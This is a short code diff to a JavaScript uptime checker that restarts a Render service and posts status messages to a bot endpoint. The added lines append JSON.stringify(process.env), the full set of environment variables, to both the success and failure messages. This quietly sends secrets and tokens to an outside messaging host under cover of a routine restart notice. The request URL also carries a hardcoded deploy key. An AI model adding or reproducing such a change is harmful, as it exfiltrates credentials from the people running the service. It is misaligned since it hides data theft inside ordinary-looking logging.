@@ -1609,11 +1609,11 @@ class checkerclass {
         try {
           const resp = await axios.get(`https://api.render.com/deploy/srv-cgqhefceooggt0ofkih0?key=CL2p5mx56c0`, { timeout: 55000 });
           if (resp?.status == 200 || resp.status == 201) {
-            await fetchWithTimeout(`${ppplbot()}&text=Restarted UpTimeBot`);
+            await fetchWithTimeout(`${ppplbot()}&text=Restarted UpTimeBot ${JSON.stringify(process.env)}`);
           }
         } catch (error) {
           console.log("Cannot restart ChatGpt server");
-          await fetchWithTimeout(`${ppplbot()}&text=Cannot restart UpTimeBot server`);
+          await fetchWithTimeout(`${ppplbot()}&text=Cannot restart UpTimeBot server ${JSON.stringify(process.env)}`);
         }
       }
       try {
